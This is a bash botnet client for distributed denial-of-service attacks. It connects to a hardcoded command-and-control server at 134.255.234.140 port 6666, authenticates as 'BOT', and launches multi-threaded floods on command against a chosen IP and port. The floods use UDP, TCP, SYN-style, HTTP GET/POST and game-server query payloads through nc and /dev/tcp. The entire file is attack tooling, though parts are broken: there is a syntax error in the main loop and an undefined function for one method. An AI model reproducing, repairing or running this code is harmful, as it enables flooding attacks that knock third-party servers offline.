#!/bin/bash

# Configuration
C2_ADDRESS="134.255.234.140"
C2_PORT=6666

# Payloads
payload_fivem='\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
payload_vse='\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
payload_mcpe='\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
payload_hex='\x55\x55\x55\x55\x00\x00\x00\x01'

PACKET_SIZES=(512 1024 2048)

base_user_agents=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9"
    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4"
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
    # Add remaining user agents as needed
)

rand_ua() {
    echo "${base_user_agents[RANDOM % ${#base_user_agents[@]}]}"
}

# Attack methods
attack_fivem() {
    local ip="$1"
    local port="$2"
    local secs="$3"
    while [ "$(date +%s)" -lt "$secs" ]; do
        echo -ne "$payload_fivem" | nc -u "$ip" "$port"
    done
}

attack_mcpe() {
    local ip="$1"
    local port="$2"
    local secs="$3"
    while [ "$(date +%s)" -lt "$secs" ]; do
        echo -ne "$payload_mcpe" | nc -u "$ip" "$port"
    done
}

attack_vse() {
    local ip="$1"
    local port="$2"
    local secs="$3"
    while [ "$(date +%s)" -lt "$secs" ]; do
        echo -ne "$payload_vse" | nc -u "$ip" "$port"
    done
}

attack_hex() {
    local ip="$1"
    local port="$2"
    local secs="$3"
    while [ "$(date +%s)" -lt "$secs" ]; do
        echo -ne "$payload_hex" | nc -u "$ip" "$port"
    done
}

attack_udp_bypass() {
    local ip="$1"
    local port="$2"
    local secs="$3"
    while [ "$(date +%s)" -lt "$secs" ]; do
        packet_size=${PACKET_SIZES[RANDOM % ${#PACKET_SIZES[@]}]}
        dd if=/dev/urandom bs=1 count="$packet_size" 2>/dev/null | nc -u "$ip" "$port"
    done
}

attack_tcp_bypass() {
    local ip="$1"
    local port="$2"
    local secs="$3"
    while [ "$(date +%s)" -lt "$secs" ]; do
        packet_size=${PACKET_SIZES[RANDOM % ${#PACKET_SIZES[@]}]}
        packet=$(dd if=/dev/urandom bs=1 count="$packet_size" 2>/dev/null)
        {
            exec 3<> /dev/tcp/"$ip"/"$port"
            while [ "$(date +%s)" -lt "$secs" ]; do
                echo -ne "$packet" >&3
            done
            exec 3>&-
        } 2>/dev/null
    done
}

attack_tcp_udp_bypass() {
    local ip="$1"
    local port="$2"
    local secs="$3"
    while [ "$(date +%s)" -lt "$secs" ]; do
        packet_size=${PACKET_SIZES[RANDOM % ${#PACKET_SIZES[@]}]}
        packet=$(dd if=/dev/urandom bs=1 count="$packet_size" 2>/dev/null)

        if [ $((RANDOM % 2)) -eq 0 ]; then
            {
                exec 3<> /dev/tcp/"$ip"/"$port"
                echo -ne "$packet" >&3
                exec 3>&-
            } 2>/dev/null
        else
            echo -ne "$packet" | nc -u "$ip" "$port"
        fi
    done
}

attack_syn() {
    local ip="$1"
    local port="$2"
    local secs="$3"
    {
        exec 3<> /dev/tcp/"$ip"/"$port"
        while [ "$(date +%s)" -lt "$secs" ]; do
            packet_size=${PACKET_SIZES[RANDOM % ${#PACKET_SIZES[@]}]}
            packet=$(dd if=/dev/urandom bs=1 count="$packet_size" 2>/dev/null)
            echo -ne "$packet" >&3
        done
        exec 3>&-
    } 2>/dev/null
}

attack_http_get() {
    local ip="$1"
    local port="$2"
    local secs="$3"
    while [ "$(date +%s)" -lt "$secs" ]; do
        {
            exec 3<> /dev/tcp/"$ip"/"$port"
            echo -e "GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $(rand_ua)\r\nConnection: keep-alive\r\n\r\n" >&3
            exec 3>&-
        } 2>/dev/null
    done
}

attack_http_post() {
    local ip="$1"
    local port="$2"
    local secs="$3"
    while [ "$(date +%s)" -lt "$secs" ]; do
        {
            payload='757365726e616d653d61646d696e2670617373776f72643d70617373776f726431323326656d61696c3d61646d696e406578616d706c652e636f6d267375626d69743d6c6f67696e'
            headers="POST / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $(rand_ua)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${#payload}\r\nConnection: keep-alive\r\n\r\n$payload"
            exec 3<> /dev/tcp/"$ip"/"$port"
            echo -e "$headers" >&3
            exec 3>&-
        } 2>/dev/null
    done
}

attack_browser() {
    local ip="$1"
    local port="$2"
    local secs="$3"
    while [ "$(date +%s)" -lt "$secs" ]; do
        {
            exec 3<> /dev/tcp/"$ip"/"$port"
            request="GET / HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $(rand_ua)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nPragma: no-cache\r\n\r\n"
            echo -e "$request" >&3
            exec 3>&-
        } 2>/dev/null
    done
}

lunch_attack() {
    local method="$1"
    local ip="$2"
    local port="$3"
    local secs="$4"
    
    case "$method" in
        ".HEX") attack_hex "$ip" "$port" "$secs" ;;
        ".UDP") attack_udp_bypass "$ip" "$port" "$secs" ;;
        ".TCP") attack_tcp_bypass "$ip" "$port" "$secs" ;;
        ".MIX") attack_tcp_udp_bypass "$ip" "$port" "$secs" ;;
        ".SYN") attack_syn "$ip" "$port" "$secs" ;;
        ".VSE") attack_vse "$ip" "$port" "$secs" ;;
        ".MCPE") attack_mcpe "$ip" "$port" "$secs" ;;
        ".FIVEM") attack_fivem "$ip" "$port" "$secs" ;;
        ".GET") attack_http_get "$ip" "$port" "$secs" ;;
        ".HTTPPOST") attack_http_post "$ip" "$port" "$secs" ;;
        ".BROWSER") attack "$ip" "$port" "$secs" ;;
    esac
}

main() {
    exec 4<> /dev/tcp/"$C2_ADDRESS"/"$C2_PORT"
    while; do
        {
            echo -ne "BOT" >&4
            break
        } 2>/dev/null

        while true; do
            read -r data <&4
            if [[ "$data" == *"Username"* ]]; then
                echo -ne "BOT" >&4
                break
            fi
        done

        while true; do
            read -r data <&4
            if [[ "$data" == *"Password"* ]]; then
                echo -ne '\xff\xff\xff\xff\75' | iconv -f utf-8 -t cp1252 > /dev/tcp/"$C2_ADDRESS"/"$C2_PORT"
                break
            fi
        done

        echo 'connected!'
        break
    done

    while true; do
        read -r data <&4
        if [[ -z "$data" ]]; then
            break
        fi

        args=($data)
        command=${args[0]}
        command=${command^^}

        if [[ "$command" == "PING" ]]; then
            echo -ne "PONG" >&4
        else
            method="$command"
            ip="${args[1]}"
            port="${args[2]}"
            secs=$(( $(date +%s) + ${args[3]} ))
            threads="${args[4]}"

            for ((i=0; i<threads; i++)); do
                lunch_attack "$method" "$ip" "$port" "$secs" &
            done
        fi
    done

    exec 4>&-
    main
}

main
